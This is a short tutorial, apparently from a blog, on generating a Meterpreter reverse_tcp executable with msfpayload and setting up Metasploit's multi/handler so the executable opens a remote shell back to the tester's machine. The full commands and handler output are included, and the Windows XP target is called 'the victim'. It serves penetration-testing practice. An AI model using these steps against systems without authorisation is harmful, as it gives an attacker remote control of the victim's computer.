If you want to test Meterpreter without having to find a bug, hack the machine, etc. you can use msfpayload to generate an .exe that runs Meterpreter and leave msfconsole with the multi/handler running on your machine, waiting for the connection. Let's see step-by-step how to prepare this.
First, let's start by preparing the .exe that will run on a Windows XP machine. Since I want the target machine to connect to mine when the service runs, I'm going to use windows/meterpreter/reverse_tcp and tell it to connect to port 4444 on my machine:
# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 X > meterpreter.exe
This will cause the meterpreter.exe executable to be created in the current directory. Now just transfer this file to Windows. However, before running it on the victim, let's prepare our machine to receive the connection:
# msfconsole

msf > use multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > set LHOST 192.168.1.2
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.2:4444
[*] Starting the payload handler…
If you don't know multi/handler I'll give you a quick explanation. This “exploit” works as a wildcard; just indicate the payload that will connect to the machine where it is running and configure the options of this payload properly so that it starts a socket with the parameters you defined and waits for the connection. In our case, we indicate the payload that we use when creating the executable that we send to the Windows XP machine. When this executable runs on the victim, he will be able to connect to our machine because the multi/handler has already laid the groundwork and is waiting for him to connect.
When you run meterpreter.exe on the victim, you will see Metasploit sending the rest of the payload to the victim (remember when I said that Meterpreter is staged? So…). Then the connection will be established and you will have a Meterpreter shell on the victim without any headache.
